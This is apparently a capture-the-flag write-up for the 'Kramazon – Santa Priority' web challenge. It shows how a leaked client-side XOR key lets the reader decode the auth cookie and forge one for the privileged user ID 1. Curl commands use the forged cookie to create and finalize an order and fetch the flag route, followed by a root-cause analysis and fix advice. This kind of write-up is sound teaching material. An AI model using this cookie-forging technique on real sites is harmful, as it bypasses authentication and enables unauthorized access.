@@ -1,0 +1,166 @@
+Kramazon – Santa Priority (Auth Cookie Bypass)
+Challenge Summary
+
+The challenge implements a shopping workflow where users create orders, wait in a queue, and finalize them. A special “Santa” user receives priority handling and access to an internal route containing the flag.
+
+Authentication is handled via a cookie named auth. Client-side JavaScript leaks the obfuscation logic used to encode this cookie, allowing full authentication and authorization bypass.
+
+Key Observations
+1. Client-side XOR “obfuscation”
+
+In script.js, the following function appears:
+
+function santaMagic(n) {
+  return n ^ 0x37; // TODO: remove in production
+}
+
+
+This immediately indicates:
+
+XOR is used for encoding
+
+The key (0x37) is leaked client-side
+
+No cryptographic signing or verification exists
+
+2. Authentication stored entirely in a cookie
+
+The homepage sets a cookie:
+
+Set-Cookie: auth=BA4FBg==
+
+
+Decoding:
+
+echo BA4FBg== | base64 -d | xxd
+04 0e 05 06
+
+
+XOR each byte with 0x37:
+
+04 ^ 37 = 33
+0e ^ 37 = 39
+05 ^ 37 = 32
+06 ^ 37 = 31
+
+
+ASCII:
+
+"3921"
+
+
+This confirms:
+
+The cookie decodes to the ASCII user ID
+
+User 3921 is a normal user
+
+3. Privilege check relies only on decoded cookie
+
+The server ignores any user value sent in JSON and always derives identity from the auth cookie.
+
+When the decoded user ID equals 1, the server enables Santa-level privileges.
+
+Exploitation
+Step 1: Forge Santa cookie
+
+Target decoded value:
+
+"user" = "1"
+
+
+ASCII:
+
+"1" = 0x31
+
+
+XOR encode:
+
+0x31 ^ 0x37 = 0x06
+
+
+Base64 encode:
+
+printf '\x06' | base64
+
+
+Result:
+
+Bg==
+
+
+Forged cookie:
+
+auth=Bg==
+
+Step 2: Create an order
+curl -X POST \
+  -H "Content-Type: application/json" \
+  -H "Cookie: auth=Bg==" \
+  https://kramazon.csd.lol/create-order
+
+
+Response includes:
+
+order_id
+
+callback_url
+
+Step 3: Finalize as Santa
+curl -X POST \
+  -H "Content-Type: application/json" \
+  -H "Cookie: auth=Bg==" \
+  https://kramazon.csd.lol/finalize \
+  -d '{
+    "order": "03650a18"
+  }'
+
+
+Response:
+
+{
+  "privileged": true,
+  "internal_route": "/priority/manifest/route-2025-SANTA.txt",
+  "flag_hint": "flag{npld_async_cookie_"
+}
+
+Step 4: Retrieve the flag
+curl -H "Cookie: auth=Bg==" \
+  https://kramazon.csd.lol/priority/manifest/route-2025-SANTA.txt
+
+
+This returns the full flag.
+
+Root Cause
+
+Authentication stored client-side
+
+XOR used instead of cryptography
+
+XOR key leaked in JavaScript
+
+No cookie signing or integrity checks
+
+Server trusts reversible cookie data for authorization
+
+Vulnerability Class
+
+Broken Authentication
+
+Broken Authorization
+
+Insecure Obfuscation
+
+Client-side Trust Violation
+
+Fix Recommendation
+
+Never store identity directly in cookies without signing (HMAC/JWT)
+
+Never rely on client-side logic for authentication
+
+Remove reversible encodings
+
+Enforce authorization server-side only
+
+Flag
